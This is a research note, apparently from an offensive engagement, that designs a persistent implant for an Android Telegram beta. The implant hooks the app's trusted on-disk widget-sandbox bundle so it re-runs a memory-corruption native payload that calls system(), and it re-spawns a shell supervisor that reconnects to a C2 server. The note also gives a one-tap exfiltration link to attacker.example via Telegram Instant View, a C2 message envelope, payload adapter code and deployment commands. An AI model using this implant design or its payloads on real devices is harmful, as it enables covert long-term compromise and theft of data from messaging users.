# Second persistence vector: on-disk widget-sandbox bundle hook + supervisor re-arm

Date: 2026-11-02
Target: `org.telegram.messenger.beta` 13.2.0, versionCode **72799**, Sony XQ-BT52,
Android 13, UID 10357 (`u0_a357`).
Scope: **host-only/static**; no phone or emulator runs in this task.  The
established findings (native-lib fallback root-gated; no app-data code at app
start; widget sandbox JS-only; force-stop kills the app-UID watcher) are taken
as constraints, not re-litigated.  This note adds one new on-disk code path and
corrects one storage claim.

---

## 0. TL;DR

1. **New second vector (real, static + local harness):** Telegram extracts the
   widget sandbox to `files/widget-sandbox/<sha256(manifest)[:12]>/` and trusts
   that directory whenever the `ready` file exists.  `sandbox-bundle.js` is
   evaluated from app data on **every widget engine create**.  Appending a hook
   to it survives app restart, `am force-stop`, recents kill, package update
   (if the widget manifest is unchanged) and reboot.  It does **not** run at app
   start; it needs a widget render.
2. **Legit JS-only capabilities:** read `viewer`/`chatData`/`publicData`/
   `chatType`/theme; write 4 KiB `localStorage` (which is **disk-backed** via
   `widget_state` on 72799 — the 72789 audit's "in-memory only" is wrong for
   this build); beacon/command via `request()` to the widget's bot (1/5 s,
   visible, `background_query`); one-tap exfil via `openTelegramLink("t.me/iv?...")`
   (silent, server-side fetch); UI redress.  **No direct host network**
   (no fetch/XHR/WS/EventSource/img/DNS/file/exec) was found.
3. **Best second vector:** the on-disk bundle hook is the durable seed.  It can
   carry the already-proven **1865-v2** native payload (10/10 on 72799, no
   crash as a widget script) and re-spawn the detached supervisor on the next
   widget render after force-stop/reboot.  This is a **design**; the
   bundle/timer context is not yet tested (T5), and the supervisor remains a
   session extender, not force-stop persistence.
4. **Exact force-stop guarantee:** `setsid` changes the session, not the UID
   cgroup.  `am force-stop`, recents/`am kill` (when the app is actually
   killed), package update and reboot kill the cgroup; only a different
   UID/cgroup survives.  App-crash survival is a race (`DoKillProcessGroupOnce`
   returns 0 on `ENOENT` when the process is already dead), not a guarantee.
5. **No other non-root startup/native persistence found** beyond the root-gated
   `files/lib` fallback.  FFmpeg/TGS/images/SQLite/exported components are
   assessed in §4; none gives a plausible no-root code path today.

Everything below distinguishes **proven**, **source-derived**, and **untested**.

---

## 1. Force-stop vs normal restart: what a detached supervisor really survives

### 1.1 The mechanism

A `setsid` child stays in the Telegram app's **cgroup**:
`/sys/fs/cgroup/uid_10357/pid_<app_pid>/`.  `setsid` changes the POSIX
session/process group; it does not move the process to another cgroup and does
not require (or obtain) any capability.

AOSP 13.0.0_r1 paths (all checked):

| event | AOSP path | effect on the cgroup child |
|---|---|---|
| `am force-stop` | `ActivityManagerService.forceStopPackage` (`:3977`) sets `setPackageStoppedState(true)` (`:4015`), then `forceStopPackageLocked` (`:4459`) → `ProcessList.killPackageProcessesLSP` (`ProcessList.java:2702`) → `ProcessRecord.killLocked` (`ProcessRecord.java:1064`) → `ProcessList.killProcessGroup` (`:1088`) → `Process.killProcessGroup(uid,pid)` | `libprocessgroup` `KillProcessGroup` reads `cgroup.procs` and kills every pid/process group in `uid_<uid>/pid_<pid>`; the `setsid` child is in that file → **killed** |
| `am kill` / `killBackgroundProcesses` | `ActivityManagerService.killBackgroundProcesses` (`:3824`) → `killPackageProcessesLSP(... SERVICE_ADJ ...)` | same `killLocked` path → **killed if the app is at/below SERVICE_ADJ**; if the app is above it, the app is not killed and the child survives because the app survives |
| recents swipe | `ActivityTaskSupervisor.cleanUpRemovedTaskLocked` (`:1628`) → `killProcessesForRemovedTask` (`:1689`) → `ActivityManagerService.killProcessesForRemovedTask` (`:16727`) → `pr.killLocked("remove task", ...)` (`:16735`) | same `killLocked` path if the process is background and has no foreground service → **killed**; with a foreground service the app is not killed, so the child survives only because the app lives |
| package update | `PackageManagerService.killApplication` (`:2926`) → AMS `killApplication` (`:4060`) → `KILL_APPLICATION_MSG` (`:1748`) → `forceStopPackageLocked` | same force-stop cgroup kill → **killed** |
| Java crash (`am crash`) | `AppErrors.crashApplicationInner` → `removeProcessLocked` (`AppErrors.java:668`) while the process is alive | `killLocked` while the cgroup path exists → **likely killed** |
| native crash / SIGSEGV | `ActivityManagerService.appDiedLocked` (`:3235`) → `ProcessList.killProcessGroup(app.uid,pid)` (`:3315`) **after** the process is already dead | `DoKillProcessGroupOnce` opens `uid_<uid>/pid_<pid>/cgroup.procs`; if the cgroup directory is already gone it returns 0 with the comment "This happens when process is already dead" (`system/core/libprocessgroup/processgroup.cpp:347-357`) → **race; may survive** |
| reboot | kernel kills everything | **killed**; no watcher auto-start |
| clear data / uninstall | data/cgroup removed | **killed + hook removed** |

`forceStopPackageLocked` also stops services, removes providers/broadcasts, and
`finishForceStopPackageLocked` (`:4295`) sends `ACTION_PACKAGE_RESTARTED`.
`AlarmManagerService` (`UninstallReceiver`, `:5093`) and `JobSchedulerService`
(`:967`) cancel alarms/jobs on that action.  Even if a child survived, the
package is in the **stopped state** until the user launches it; `BOOT_COMPLETED`
is not delivered to a stopped package.

### 1.2 Exact persistence guarantee

> A detached `setsid` supervisor in the Telegram UID is a **session extender**,
> not a force-stop/reboot persistence mechanism.  It survives only process
> deaths where the post-mortem cgroup kill loses the `ENOENT` race (observed for
> one native crash).  It does **not** survive `am force-stop`, a recents/`am
> kill` that actually kills the app, a package update, a reboot, clear data or
> uninstall.  No `setsid`/double-fork/`PR_SET_PDEATHSIG` trick changes the
> cgroup; escaping needs a different UID (root, shell, or a second app) or
> cgroup write access, neither of which is available at UID 10357.

The existing test remains the anchor: the app-UID watcher died on
`am force-stop` (`telegramandroidwidget/notes/persistence_20261101.md` §5); the same script as root
survived and reconnected because root is in a different cgroup
(`telegramandroidwidget/evidence/evidence_20261101/persistence/root_dryrun.txt`).

### 1.3 Safe test matrix for later (Sony only; no Pixel)

Use a **log-only** watcher first; it writes `PID/cgroup/heartbeat` to
`files/.p2.log`, no socket.  Repeat each of a1/a2 five times; record the rate,
not a single result.

| # | event | command | prediction |
|---|---|---|---|
| a1 | Java crash | `adb shell am crash org.telegram.messenger.beta` | likely killed (removeProcessLocked while alive) |
| a2 | native crash | `adb shell kill -SEGV <app_pid>` (if SELinux allows) | may survive (cgroup ENOENT race) |
| b | recents swipe | UI swipe, or `am task remove <taskId>` if present | killed if the app is killed; not killed if a foreground service keeps the app alive |
| c | force-stop | `adb shell am force-stop org.telegram.messenger.beta` | killed (verified) |
| d | package update | `adb install -r <same-version.apk>` | killed; the bundle file survives |
| e | reboot | `adb reboot` | killed; app not running until launch |
| f | `am kill` | `adb shell am kill org.telegram.messenger.beta` | killed if at/below SERVICE_ADJ |

Check `/proc/<watcher>/cgroup` before/after; a surviving watcher must still be
in `uid_10357/pid_<old_app_pid>` (or the app's new cgroup), which is exactly why
force-stop finds it.

### 1.4 Reconnect-on-app-PID-change design

`notes/poc/watcher_supervisor.sh` is the draft.  Requirements:

- **Single instance:** `mkdir files/.p2.lock` + `pid` file; stale lock
  recovery (`kill -0`); the bundle hook may re-spawn the supervisor, so
  duplicates must be impossible.
- **PID poll:** `pidof org.telegram.messenger.beta` every 2 s; on change,
  kill the old shell/nc pair, reopen the FIFO/nc session, send
  `WATCHER_HELLO ... reason=app_restart`.
- **Heartbeat:** every 30 s on the live session; a dead `nc` is detected by
  `kill -0` and reconnected.
- **Re-arm:** if the app is gone but the supervisor survived a native crash,
  `am start -a android.intent.action.VIEW -d
  'tg://openmessage?chat_id=<CHAT>&message_id=<MID>'` opens the widget chat,
  which renders the widget and lets the **bundle hook** re-run the native
  payload.  `am` from the app UID may be denied by SELinux/AMS; it is
  best-effort and rate-limited (60 s).
- **Never** `su`; the watcher runs as UID 10357 and uses only app data,
  `toybox nc`, and the app's INTERNET permission.
- **Logs:** `files/.p2.log`; include `uid`, `pid`, `app_pid`, `reason`,
  `hook=p2`.

The supervisor cannot survive force-stop; the bundle hook is the re-arm.  The
two are complementary, not redundant.

---

## 2. Widget bundle JS persistence: the on-disk code path

### 2.1 The cache is trusted after `ready`

`org.telegram.utils.twidget.b0.a(Context)` (`b0.java`):

```java
// line 34: assets.open("WidgetSandbox/manifest.txt")
// line 52: sha256(manifest bytes)
// line 57-62: first 12 hex chars
// line 63: new File(context.getFilesDir(), "widget-sandbox/" + sb)
// line 64-65: File ready = new File(file2, "ready");
//             if (!ready.isFile()) { ...extract and verify each file... }
// line 145: b = file2; return file2;
```

- The directory name is `sha256(manifest.txt)[:12]`; for both 72789 and 72799
  the manifest is identical, so the directory is
  `files/widget-sandbox/eb66a43ba04d/`.
- The **only** integrity gate at load is `ready.isFile()`.  The per-file
  SHA-256 checks (lines 84-118) run only during extraction, never when
  `ready` exists.  Replacing `sandbox-bundle.js` in that directory is not
  detected.
- `k0.e()` (`k0.java:601`) passes `b0.a(this.c).getAbsolutePath()` to
  `WidgetSandboxNative.create(...)`.  The native `sub_778B90` loads
  `<dir>/sandbox-bundle.js`, `<dir>/sandbox-bundle.qbc`,
  `<dir>/validator-bundle.js`, `<dir>/validator-bundle.qbc`, and
  `<dir>/renderer-bundle.js`.

### 2.2 JS vs QBC

`sub_784578` (0x784578) receives the JS source and the QBC vector:

- if the QBC vector is empty → `JS_Eval` the JS source, kind `"source"`;
- else → `sub_7772AC` bytecode; the TWQB header is checked in `sub_17B0568`:
  magic `TWQB`, format 1, source length, and an FNV-1a 64 hash of the JS source.
  A mismatch logs `bytecode: compiled from a different source (stale .qbc?)`;
  the caller logs `sandbox-bundle.js: falling back to source — ...` and evals
  the JS.
- Therefore: append to `sandbox-bundle.js` and either (a) leave the old `.qbc`
  (it becomes stale; the loader falls back to source), or (b) rename/remove
  `<dir>/sandbox-bundle.qbc` so the JS path is unconditional.  The deployment
  script does (b) for determinism; the `.qbc` is only an optimization.
- The `.qbc` hash is **not** a trust anchor: it binds the bytecode to the JS
  source, and both live in the same attacker-writable directory.

### 2.3 When it runs, and what survives

- The bundle is evaluated on **every widget engine create**, i.e. whenever a
  bot widget is rendered (chat message, inline result, page block).  A cold
  start on the chat list does **not** create an engine (`persistence_20261101.md`
  §4); the hook does not run at app start.
- This is different from a malicious **widget message**: the message widget is
  server-side, visible and deletable; the bundle hook is local, invisible in the
  chat, and applies to every widget render (including other bots' widgets) once
  deployed.  The message remains the delivery/control channel; the bundle hook
  is the durable local stage.
- The hook runs at the **end of the bundle**, before `hide-host.js`; it can
  capture `__host`/`__hostOps` while they still exist.  `TelegramWidget` is
  defined at that point, but its config fields (`viewer`, `chatData`,
  `publicData`, `chatType`, theme) are applied during the subsequent boot
  dispatch.  Use `setTimeout(tick, 0)` and poll (the local harness confirms
  `setTimeout`, `localStorage`, `queueMicrotask` exist at bundle end; it does
  not run timers/hide-host).
- **Survives:** app process death, recents kill, `am force-stop`, reboot,
  package update if `manifest.txt` is unchanged (same hash dir, `ready`
  present).
- **Removed by:** clear data/uninstall, a cleaner that deletes
  `files/widget-sandbox`, or an update whose `manifest.txt` changes (new hash
  dir; the old hook remains but is unused).  A future extension could pre-create
  the new `<hash>` dir from the downloaded APK before the update; not tested.

### 2.4 Local harness validation (host-only)

```
$ <HOME>/ailocal/Telegram/telegramandroidwidget/lab/lab_widget_rel \
    hooked_full.js widget.html 300 0
[*] bundle 605033 bytes
[host] diag [p2] eval host=true ops=true
[host] timer [1,0]
[*] bundle evaluated
free(): invalid size        # harness teardown artifact, after eval
```

The hook is appended to the real 596,053-byte `sandbox-bundle.js` (md5
`0ac9ea50c516271df7519a2d569a71fa`).  The `free(): invalid size` occurs at
harness/QuickJS teardown, not during the hook; the app path is not affected by
this harness stub.  The harness uses 64 MiB and a stub `__host`; the app uses
6 MiB and the native bridge, so this only proves the injection point and API
names, not the native gates.

### 2.5 What the hook can do with the legitimate API

| capability | detail | no tap? |
|---|---|---|
| `TelegramWidget.viewer` | numeric user id, and possibly username/name/premium; populated only when `can_query` | yes |
| `chatData` / `publicData` | ≤1024 B each; bot-controlled; public data refreshable with `watchPublicData` | yes |
| `chatType`, `isForward`, `isPreview`, theme, locale, safe area | fingerprint/context | yes |
| `localStorage` / `sessionStorage` | 4 KiB/area; **disk-backed** via `widget_state` on 72799 (see §2.6); per widget | yes |
| `request(data,{wallet})` | 1–64 B UTF-8; 1 per 5 s while visible; `background_query` for no tap; `messages.getBotWidgetQueryAnswer`; answer returns to JS | yes (with `background_query`) / one tap otherwise |
| `watchPublicData` | bot can update `public_data`; the hook can read commands | yes |
| `openTelegramLink` | one tap; `t.me`/`telegram.me`/`telegram.dog` only; silent (no dialog); `t.me/iv?url=...` makes Telegram's IV server fetch an attacker URL | one tap |
| `openLink` | one tap + confirmation dialog showing the URL | one tap + confirm |
| `copyText` | one tap; clipboard write; may be unwired in Java | one tap |
| `HapticFeedback` | one tap/touch series; max 5/burst | touch |
| DOM/CSS | overlay/phishing, hide/replace widget content | yes (visual only) |
| `document.title`, `console.*` | widget title / logcat | yes (no egress) |

**No direct host channel.**  The audit's no-fetch/no-XHR/no-WebSocket/
no-EventSource/no-Worker/no-beacon/no-img-fetch/no-CSS-fetch/no-form-navigation
result holds; `<img>` is data-URI only; `fetch`/XHR/WS are stubs; `openLink` is
tap-gated and dialoged.  The **only** no-tap egress is `request()` to the
widget's bot; the bot is the relay, not a socket from the device.  A direct
attacker-host beacon is **not** possible with the legitimate API.

**One-tap host exfil is possible:** `openTelegramLink("https://t.me/iv?url=https://attacker.example/c?d=<b64>")`
opens Telegram's Instant View; Telegram's server fetches the inner URL, so the
attacker's collector sees the data (with Telegram's IP, not the device's).  The
URL is ≤256 bytes; `openTelegramLink` is silent; one tap per call.  `openLink`
to a non-Telegram host shows the full URL in a dialog and is consent-phishing,
not silent.

### 2.6 Correction: `localStorage` is disk-backed on 72799

The 72789 audit (`widget_js_api_audit.md` §5.1) says local/session storage is
in-memory only (`p.f44432c`) and never written to disk.  In the 72799 build the
code has a disk path:

- `hs.java:205` creates `widget_state(uid INTEGER, mid INTEGER, local TEXT,
  PRIMARY KEY(uid, mid))`.
- `w.java` `h(area, JSONObject)` merges the area into `p.f44432c`; for
  `"local"` it also puts into `p.d` and schedules `p.e` after 1000 ms.
- `p.java:302` `p.j()` iterates `p.d`, extracts the local JSON, and calls
  `hs.a0(...).a.c(new rk(mVar.d, 5, mVar.c, a0, localJson))`.
- `rk.run` case 5 (dexdump, class `Lorg/telegram/messenger/rk;`): `DELETE FROM
  widget_state WHERE uid = ... AND mid = ...`, `REPLACE INTO widget_state
  VALUES(?, ?, ?)`.
- `v1.java:155` reads `SELECT local FROM widget_state WHERE uid = ... AND mid =
  ...` at widget creation and passes it back into the engine config.  The read
  is scheduled from the widget-message creation path (`v1` case 3 through
  `hs.a.c`), so it is not dead code.

Consequence: the hook can keep a small state across process death, force-stop
and reboot (debounced 1 s; per widget; 4 KiB).  This directly contradicts the
audit's "in-memory only" for 72799.  It is source-derived, not device-tested;
the test is T2 in `notes/poc/test_plan.md` (set, wait 2 s, force-stop, reopen).
Do not rely on it for crash-critical state until T2 passes; the bot channel is
the reliable command path.

### 2.7 Hook limitations

- Needs a **widget render**; not app start, not chat-list, not a notification.
- 6 MiB JS heap, 500 ms/script CPU, 64 timers, 4 KiB storage per area; keep the
  hook small and guarded.
- The bundle is global: act only on widgets whose `publicData`/`chatData`
  contains the `P2` magic; otherwise only the boot poll runs.
- A widget render can be forced by the attacker's bot message; the victim must
  open the chat.  A DB patch can put a widget in a frequently opened chat, but
  the plan below uses a real bot message (server-backed, no DB corruption).
- Detection: comparing the cached bundle to the APK asset (md5/size) exposes
  it; logcat shows the `falling back to source` line when the `.qbc` is stale.
  No signature check protects it.

---

## 3. The best second vector: layered durable seed + re-arm

### 3.1 Architecture

```
attacker bot ── widget message + publicData ──► Telegram cloud (persistent)
                                                   │
 victim opens widget chat                          ▼
                                   WidgetSandboxEngine create
                                                   │
             files/widget-sandbox/<hash>/sandbox-bundle.js  (hook, on disk)
                                                   │
                     ┌─────────────────────────────┴─────────────────────┐
                     ▼                                                   ▼
       legitimate JS API                                  1865-v2 native payload
  viewer/chatData/publicData/localStorage              system("...") in app process
  request() to bot (1/5 s, no tap)                     (10/10 on 72799, no crash)
  openTelegramLink IV (one tap)                                   │
  UI redress                                                      ▼
                                                     detached supervisor (shell)
                                                     reconnects on app PID change
                                                     dies on force-stop/update/reboot
                                                     re-created by the next render
```

- **Layer 0 (server):** the widget message and `publicData` are the stable
  control channel; they survive reinstall and are visible only as a normal bot
  message.  The bot can update `publicData` without resending the message.
- **Layer 1 (disk):** the bundle hook is the durable code seed.  It survives
  force-stop/reboot and runs on the next render.  With the legitimate API it is
  a JS beacon/UI implant; with the 1865-v2 payload it is a native command
  trigger.
- **Layer 2 (process):** the supervisor gives a full shell between renders; it
  is best-effort (see §1).  The hook re-creates it.
- **Layer 3 (not available):** a second app with its own UID/cgroup would
  survive force-stop; installing one needs the user/root, so it is out of
  scope.  Root/shell is out of scope by the task.

### 3.2 Trigger and re-arm flow

1. Attacker's bot sends a widget to the victim (private chat with the bot is
   safest for `background_query`; a group/channel may or may not be allowed by
   the server — the client has no chat-type check, but test it).
2. Victim opens the chat; the engine loads the modified bundle.
3. Hook reads `publicData`; if it contains `P2|<nonce>|<b64cmd>`, it runs the
   command.  A command `native:<b64>` calls `runNative`; a command `js:...`
   runs sandbox JS; `hb` sends a heartbeat; `link:` opens a Telegram link.
4. `runNative` initializes the 1865-v2 payload (with `__p2_cmd='true'` for the
   first run), then writes the real command into the payload's pinned buffer and
   frees a 4096-byte string; the installed `js_free=system` calls
   `system(command)`.  The v2 payload is 10/10, no crash, on 72799 as a widget
   script.  **The bundle/timer context is new and must be tested** (T5).
5. The command starts `watcher_supervisor.sh` if not already running (lock/PID
   check); the supervisor connects to the C2, sends `WATCHER_HELLO`.
6. `am force-stop`/reboot kills the supervisor.  The bundle file remains.  The
   next widget render re-runs the hook; the bot can re-send the `native:`
   command (or the hook can run a default re-arm command if `publicData` has
   `autorun=1`); a new supervisor starts.
7. If the app is killed but the supervisor survives (native-crash race), the
   supervisor polls the app PID and reconnects; if the app is gone, it can
   `am start` the widget deep link, which renders the widget and re-runs the
   hook.

### 3.3 The 1865-v2 payload (already proven, not a new exploit)

Use the **v2** payload from
`telegramandroidwidget/evidence/evidence_20261101/new_beta_72799/v2.db`,
message 79415 (HTML 10,540 B).  The 72799 campaign: 10/10 proofs, `S3b PLT`
10/10, **no crash** (`telegramandroidwidget/notes/new_beta_72799_report.md`).  It resolves
`free`/`system` at runtime from the PLT/GOT and libc `.dynsym`; no 72789 APK
address is needed.  The universal v4 is 9/10 with one BigInt/var-ref crash;
prefer v2 for a persistence seed.

The adapter (`notes/poc/make_native_payload.py`) wraps the v2 `<script>` as
`globalThis.__p2_initNative`, replaces its fixed `cmd` with
`globalThis.__p2_cmd || "true"`, and exposes:

```js
globalThis.__p2_native = { dv, F, rt, sysA, cmdaddr };
globalThis.__p2_runNative = function (cmd) {
  // copy cmd to the pinned buf2 at 0x2000, NUL-terminate, free 4096 B
  // -> js_free(=system)(cmdaddr)
};
```

The hook calls `__p2_initNative()` once with `__p2_cmd='true'` (the first
`system("true")` is harmless), then `__p2_runNative(cmd)` for each command.
`js_free` remains `system`; any later >512 B free re-runs the last command, so
commands must be idempotent (the watcher lock does this).  The payload's `buf2`
and `dv` are pinned on `globalThis`; the command slot is 0x2000..0x3800.

**Risks (honest):**
- The payload is proven as a widget `<script>` **after** boot, not as a bundle
  timer.  The bundle has the same QuickJS runtime but a different heap state;
  6 MiB limit.  Test with a benign `id > files/.p2_proof` ten times first.
- The payload is a memory-corruption exploit; a wrong build/variant can crash
  the app.  The v2 payload is the 72799-tested one; do not substitute v4.
- `js_free=system` stays installed; a command that blocks or crashes the shell
  can hang the engine.  Keep commands short and backgrounded (`&`).
- The app process may be killed by the crash/allocator state even if the v2
  widget run survived; the supervisor/re-arm is designed for that (the next
  render tries again).  Do not create a boot loop: only act when `publicData`
  has the magic; do not run the native payload on every widget.

### 3.4 Legit-only fallback (no native exploit)

If the native payload is not used, the hook still provides:
- a **no-tap heartbeat/command loop** via `request()` to the attacker's bot
  (1/5 s while visible; `background_query` required; the bot's answer can carry
  `P2|...` commands);
- **disk state** in `widget_state` (subject to T2);
- **one-tap exfil** via `t.me/iv` or a consent dialog;
- **UI redress** (fake "Continue" / "Session expired" panel);
- no direct host socket, no file/exec, no app-start, no Telegram message/DB
  access.

This is a persistent **logic/beacon** implant, not a shell.  It is the correct
choice if the native payload proves unstable in the bundle context.

### 3.5 C2 coordination

Use a small shared envelope so the C2 agent's implant and the hook can
correlate:

```
bot -> hook (publicData, <=1024 B):   P2|<nonce>|<b64cmd>
hook -> bot (request, <=64 B):        P2|hb|<uid>,<chatType>,<fwd><prev>
                                      P2|tap|<uid>,<chatType>,<fwd><prev>
hook -> bot (request answer):         P2|<nonce>|<b64cmd>   (optional)
supervisor -> C2 (TCP):               WATCHER_HELLO uid=<uid> watcher=<pid>
                                      app_pid=<pid> reason=<initial|app_restart|reconnect> hook=p2
                                      WATCHER_HEARTBEAT ...
```

- `nonce` is a random/sequential token; the hook stores the last nonce in
  `localStorage` and rejects replays.
- The bot sees the Telegram `viewer.id` in the query update; the supervisor
  reports the app UID; the C2 can correlate the two.
- `cmd` forms: `js:<src>`, `native:<b64 shell>`, `hb`, `link:<https://t.me/...>`,
  or a bare shell command (native).
- The bot channel is rate-limited 1/5 s; the supervisor TCP channel is the
  interactive path.  The C2 should not send a new `native:` command while a
  previous one is in flight; the hook has no ack beyond `request`/`publicData`.
- The supervisor's `HELLO` includes `hook=p2` so the C2 can tell a hook-spawned
  watcher from the original RCE-spawned one.

### 3.6 Implementation files

| file | contents |
|---|---|
| `notes/poc/bundle_hook.js` | the hook (this note's §2.5/§3.2 logic) |
| `notes/poc/make_native_payload.py` | v2 HTML → `__p2_initNative` adapter |
| `notes/poc/deploy_bundle_hook.sh` | app-UID cache patcher + backups |
| `notes/poc/restore_bundle_hook.sh` | restore original JS/QBC |
| `notes/poc/watcher_supervisor.sh` | lock/PID/heartbeat/reconnect/am-start draft |
| `notes/poc/test_plan.md` | host + device matrix, cleanup, abort conditions |

Deployment sketch (run as UID 10357; the hook file is staged by the existing
widget RCE):

```sh
# on the phone, app UID
D=/data/user/0/org.telegram.messenger.beta/files
# .p2hook.js = bundle_hook.js [ + native_payload_72799.js ]
sh deploy_bundle_hook.sh        # finds the cache, backs up, appends, disables .qbc
# open a widget chat; logcat should show [p2] eval/ready
```

The deployment does not touch `cache4.db`; the only app-data changes are
`files/widget-sandbox/<hash>/sandbox-bundle.js` (+ `.p2orig`, `.qbc.p2orig`)
and the optional `files/.p2*` supervisor artifacts.  Cleanup is
`restore_bundle_hook.sh` with `P_REMOVE_ARTIFACTS=1`.

---

## 4. Other payload-installed persistence: honest assessment

| vector | trigger | persistence | verdict |
|---|---|---|---|
| **FFmpeg video/GIF auto-play** | crafted file in a message; auto-download/auto-play | file stays in cache/message; re-parsed on view/restart | FFmpeg 8.1.3, libvpx 1.17.0, dav1d 1.5.4 are newer than known CVEs; no known bug.  A new 0-day could give app-process code execution **on view**, not at boot; it is not a persistence mechanism by itself.  Low; no evidence. |
| **TGS/Lottie** | sticker render | message/cache | Rust `tlottie`, no `unsafe`, depth limits; the rlottie CVE family does not apply.  No. |
| **Images / BitmapFactory** | image render | cache | Platform `BitmapFactory`, Pixel patch 2026-10-05; only data-URI in widgets.  No. |
| **Fonts / `.attheme`** | theme load at startup/UI | theme file | `.attheme` is key/value; no arbitrary font path found; `Typeface` uses built-ins.  No. |
| **TDLib / SQLite `cache4.db`** | app start / DB open | DB file | SQLite 3.39.3 is old, but the known issues via a VIEW are info-leak/DoS; `load_extension` is disabled; no RCE.  A crafted DB can inject widget data/messages (data→JS), not native code.  No. |
| **WebView local HTML** | none at startup | — | Bot/IV WebViews have file/content access off, event-only JS bridges; no local HTML from app data at start.  No. |
| **Dex/native loader** | app start | `files/lib/libtmessages.49loc.so` | Only if `System.loadLibrary("tmessages.49")` fails; stock install never fails; app data cannot force it (root-gated, proven with root).  No. |
| **Exported components** | intents from app UID/shell | package | `LaunchActivity` (exported) can start the app/deep-link a chat — useful as a **re-arm trigger**, not a code path.  `WidgetConformanceActivity` only clears widget heights.  GCM/Wear/AppCenter/Voice components do not execute app-data code.  No. |
| **JobScheduler / AlarmManager** | scheduled work | package | Force-stop cancels alarms/jobs (`ACTION_PACKAGE_RESTARTED`); an app-UID shell cannot schedule them without the app's Java API; the stopped state blocks restart.  No. |
| **Notification listener / accessibility / device admin / VPN** | user grants | settings | Require explicit user enablement; not available to UID 10357 silently.  No. |
| **Scheduled messages** | due time | DB/server | A local `scheduled_messages_v2` insert could make the account send a message later, but it is account-visible spam, server-sync/consistency-sensitive, and not code execution.  Low; not a persistence primitive for code. |
| **Bot callbacks / `publicData`** | bot update | Telegram cloud | A real server-side C2 channel; it pairs with the bundle hook but is not device code persistence.  Use it as the control plane. |
| **`AppStartReceiver` (BOOT_COMPLETED)** | boot | package | Non-exported receiver; starts the app process on boot if the package is not stopped, but there is no widget render.  Force-stop prevents it until launch.  No. |
| **`widget_state` localStorage** | widget render | `cache4.db` | Disk-backed **data**, not code; the hook can use it for state.  Pairs with the hook. |

**Verdict:** no other non-root app-data→native-code path that runs at app start
was found.  The only durable non-root code path is the widget-sandbox bundle
(JS, and optionally the 1865-v2 native payload), because the app trusts its
own writable cache after `ready`.

---

## 5. Test plan summary

Full detail: `notes/poc/test_plan.md`.  Host tests (run now, no phone):

- `node --check` the hook and the native adapter output.
- Append the hook to the real 596,053-byte bundle and run
  `telegramandroidwidget/lab/lab_widget_rel`; expect `[p2] eval host=true ops=true` and no hook
  exception (the harness's teardown `free(): invalid size` is unrelated).
- `sh -n` the three shell files.
- Static checks of `b0.java:65`, the manifest hash, the native strings.

Device tests (Sony only, later):

1. **T0** benign hook marker; widget still renders; restore md5 matches.
2. **T1** supervisor matrix (Java crash, native crash, recents, force-stop,
   update, reboot, `am kill`); report rates, not one result.
3. **T2** localStorage persistence across force-stop (tests the `widget_state`
   correction).
4. **T3** no-tap `request` heartbeat/command in the private bot chat; verify
   the 1/5 s limit and server behavior.
5. **T4** one-tap `t.me/iv` exfil to a test collector.
6. **T5** native v2 payload in the bundle: benign `id > .p2_proof` 10x; then
   watcher start; force-stop; reopen; check new HELLO; reboot; repeat.  Stop on
   the first crash.
7. **T6** update survival; record the manifest hash; pre-create the new dir
   only as a future experiment.
8. **T7** cleanup: restore original JS/QBC, remove `.p2*`, stop the listener.

Abort on any app crash in T0/T2, any native crash in T5, or any data loss.  The
plan never modifies `cache4.db`; use a test bot/chat.

---

## 6. What is proven vs untested

**Proven / static:**
- The app-data bundle cache is `files/widget-sandbox/<sha256(manifest)[:12]>`;
  `b0.a()` only checks `ready`; per-file hashes are checked only at extraction.
- The native loader reads `sandbox-bundle.js`/`.qbc` from that dir; a stale
  `.qbc` falls back to the JS source; the TWQB header binds QBC to the JS
  source by length + FNV-1a 64.
- The hook injection point works in the real bundle (local QuickJS harness);
  `__host`, `TelegramWidget`, `setTimeout`, `localStorage`, `queueMicrotask`
  are present at bundle end; config fields are populated after boot, so poll.
- `widget_state` is a disk table written by `p.j()`/`rk` case 5 and read by
  `v1` case 3; this contradicts the 72789 audit's in-memory claim for 72799.
- Force-stop/recents/`am kill`/update/reboot cgroup kills; app-crash survival is
  an `ENOENT` race.
- The v2 1865 payload is 10/10, no crash, on 72799 as a widget `<script>`.
- No direct host network in the widget sandbox; the only no-tap egress is
  `request()` to the widget's bot; `openTelegramLink` IV is one-tap.

**Untested / needs device:**
- The hook running on a **real widget engine** (timers, hide-host, 6 MiB,
  config fields) — T0.
- `localStorage` disk persistence across force-stop — T2.
- `request` background behavior in the actual chat/server — T3.
- The 1865-v2 payload in the **bundle/timer** context (not as a widget script)
  — T5; this is the main risk.
- The supervisor survival matrix on this Android 13 build — T1.
- Update survival / manifest hash change — T6.

No claim of on-device success is made for the bundle hook or the native payload
in the bundle context.  The design is concrete, the code paths are real, and
the remaining risks are listed.

---

## 7. References

- `telegramandroidwidget/notes/persistence_20261101.md` — app-data code paths, native fallback,
  watcher force-stop test.
- `telegramandroidwidget/notes/reverse_shell_poc.md` — detached shell, app crash survival, limits.
- `telegramandroidwidget/notes/widget_js_api_audit.md` — JS API, tap model, no-fetch/no-storage-egress
  (the storage claim is corrected here for 72799).
- `telegramandroidwidget/notes/qjs_postsnapshot_f1865_report.md` — 1865 chain, universal payload,
  72799 rebuild compatibility.
- `telegramandroidwidget/notes/new_beta_72799_report.md` — v2 10/10 no crash on 72799.
- `.scratch_beta1320/jadx4b/sources/org/telegram/utils/twidget/b0.java` — cache
  and `ready` check.
- `.scratch_beta1320/jadx4b/sources/org/telegram/utils/twidget/k0.java:601` —
  cache dir passed to native `create`.
- `.scratch_beta1320/jadx4b/sources/org/telegram/utils/twidget/w.java` — storage
  callback and `p.j()` debounce.
- `.scratch_beta1320/jadx4b/sources/org/telegram/utils/twidget/p.java:302` —
  `p.j()` writer.
- `.scratch_beta1320/jadx_out/sources/org/telegram/ui/web/v1.java:155` —
  `widget_state` reader.
- `.scratch_beta1320/jadx_out/sources/org/telegram/messenger/hs.java:205` —
  `widget_state` schema.
- `libmessages_49_arm64_widget_annotated.i64`: `sub_778B90` (load bundle files),
  `sub_784578` (JS/QBC selection + fallback), `sub_785AD0` (engine start),
  `sub_17B0568` (TWQB/FNV check).  The 72799 lib has the same strings
  (`sandbox-bundle.js`, `/sandbox-bundle.qbc`, `falling back to source`,
  `stale .qbc`), though its text is shifted by the rebuild.
- AOSP 13.0.0_r1: `ActivityManagerService.java:3977,4015,4459,3315,16727`;
  `ProcessList.java:2702,2853,1492`; `ProcessRecord.java:1064,1088`;
  `ActivityTaskSupervisor.java:1628,1689`; `PackageManagerService.java:2926`;
